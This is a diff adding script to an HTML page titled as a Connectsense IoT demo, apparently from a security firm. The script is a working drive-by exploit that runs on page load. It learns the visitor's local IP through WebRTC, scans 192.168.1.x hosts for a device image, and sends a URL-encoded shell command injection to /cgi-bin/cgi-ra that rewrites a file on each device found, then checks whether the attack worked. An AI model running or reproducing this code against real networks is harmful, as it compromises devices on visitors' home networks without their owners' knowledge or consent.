@@ -3,8 +3,165 @@
   <head>
     <meta charset="UTF-8">
     <title>Connectsense-iot-demo by freeflysecurity</title>
-  </head>
-  <body>
-    <h1>This page intentionally blank for now</h1>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+    <script>
+      // From https://github.com/diafygi/webrtc-ips
+      //get the IP addresses associated with an account
+      function getIPs(callback){
+          var ip_dups = {};
+
+          //compatibility for firefox and chrome
+          var RTCPeerConnection = window.RTCPeerConnection
+              || window.mozRTCPeerConnection
+              || window.webkitRTCPeerConnection;
+          var useWebKit = !!window.webkitRTCPeerConnection;
+
+          //bypass naive webrtc blocking using an iframe
+          if(!RTCPeerConnection){
+              //NOTE: you need to have an iframe in the page right above the script tag
+              //
+              //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+              //<script>...getIPs called in here...
+              //
+              var win = iframe.contentWindow;
+              RTCPeerConnection = win.RTCPeerConnection
+                  || win.mozRTCPeerConnection
+                  || win.webkitRTCPeerConnection;
+              useWebKit = !!win.webkitRTCPeerConnection;
+          }
+
+          //minimal requirements for data connection
+          var mediaConstraints = {
+              optional: [{RtpDataChannels: true}]
+          };
+
+          var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
+
+          //construct a new RTCPeerConnection
+          var pc = new RTCPeerConnection(servers, mediaConstraints);
+
+          function handleCandidate(candidate){
+              //match just the IP address
+              var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+              var ip_addr = ip_regex.exec(candidate)[1];
+
+              //remove duplicates
+              if(ip_dups[ip_addr] === undefined)
+                  callback(ip_addr);
+
+              ip_dups[ip_addr] = true;
+          }
+
+          //listen for candidate events
+          pc.onicecandidate = function(ice){
+
+              //skip non-candidate events
+              if(ice.candidate)
+                  handleCandidate(ice.candidate.candidate);
+          };
+
+          //create a bogus data channel
+          pc.createDataChannel("");
+
+          //create an offer sdp
+          pc.createOffer(function(result){
+
+              //trigger the stun server request
+              pc.setLocalDescription(result, function(){}, function(){});
+
+          }, function(){});
+
+          //wait for a while to let everything done
+          setTimeout(function(){
+              //read candidate info from local description
+              var lines = pc.localDescription.sdp.split('\n');
+
+              lines.forEach(function(line){
+                  if(line.indexOf('a=candidate:') === 0)
+                      handleCandidate(line);
+              });
+          }, 1000);
+      }
+
+      function process_local(ip) {
+          var match = ip.match(/^(192\.168\.1\.)[0-9]{1,3}/);
+          if (!match) {
+              console.log('Ignoring network for '+ip);
+              return
+          }
+
+          var network = match[1];
+          console.log('Found local network: '+network);
+          var body = document.getElementsByTagName('body')[0];
+          check_logo(network, 1);
+      }
+      function check_logo(network, host) {
+          console.log('Checking '+network+host+' for image');
+          var img = new Image();
+          img.id = 'img-'+host;
+          img.className = 'test-images';
+          img.setAttribute('data-host',host);
+          img.setAttribute('data-network',network);
+          img.src = 'http://'+network+host+'/images/bg_content.png?'+new Date().getTime();
+          body.appendChild(img);
+          // These aren't the fastest devices so we need to give it three seconds to load the image
+          setTimeout(function() { check_try_next(img)}, 3000);
+      }
+      function check_try_next(img) {
+          var network = img.getAttribute('data-network');
+          var host = parseInt(img.getAttribute('data-host'));
+
+          if ((!img) || (!img.complete) || (!(img.naturalHeight > 0))) {
+              console.log('Unsuccessful image retrieval on '+network+host);
+              if ((img) && (img.parentNode)) {
+                img.parentNode.removeChild(img);
+              }
+              if (!(host>253)) {
+                  check_logo(network,host+1);
+              }
+              return;
+          } 
+          try_payload(network+host);
+
+      }
+      function try_payload(ip) {
+          console.log('Trying payload against '+ip);
+          var payloadImage = new Image();
+          payloadImage.addEventListener("error",function() {
+              try_verify(ip)
+           }, true);
+          payloadImage.src ='http://'+ip+'/cgi-bin/cgi-ra?%61%27%3b%20%2f%62%69%6e%2f%73%68%20%2d%63%20%27%65%63%68%6f%20%60%65%63%68%6f%20%5c%5c%23%5c%21%2f%62%69%6e%2f%73%68%60%20%3e%20%2f%68%6f%6d%65%2f%68%74%74%70%64%2f%73%65%74%75%70%3b%20%65%63%68%6f%20%22%65%63%68%6f%20%2d%65%20%53%74%61%74%75%73%3a%20%32%30%30%20%4f%4b%5c%5c%5c%5c%6e%41%63%63%65%73%73%2d%43%6f%6e%74%72%6f%6c%2d%41%6c%6c%6f%77%2d%4f%72%69%67%69%6e%3a%20%2a%5c%5c%5c%5c%6e%5c%5c%5c%5c%6e%48%65%6c%6c%6f%22%20%3e%3e%20%2f%68%6f%6d%65%2f%68%74%74%70%64%2f%73%65%74%75%70%27%3b';
+          document.getElementsByTagName('body')[0].appendChild(payloadImage);
+      }
+      function try_verify(ip) {
+          console.log('Payload send to '+ip+', checking if successful');
+          var request = new XMLHttpRequest();
+          request.open('GET', 'http://'+ip+'/cgi-bin/cgi-ra', true);
+          request.responseType = 'text';
+          request.onload = function() {
+            if (this.status == 200)  {
+              // Success!
+              if (this.responseText.replace( /^\s+|\s+$/g,'') == 'Hello') {
+                console.log('Success on http://'+ip+'/cgi-bin/cgi-ra');
+              } else {
+                console.log('Payload unsuccessful on '+ip);
+              }
+            } else {
+              console.log('Payload unsuccessful on '+ip);
+
+            }
+          };
+
+          request.onerror = function() {
+              console.log('Payload unsuccessful on '+ip);
+          };
+          request.send();
+      }
+
+      getIPs(process_local);
+    </script>
+</head>
+<body id="body">
+
   </body>
 </html>
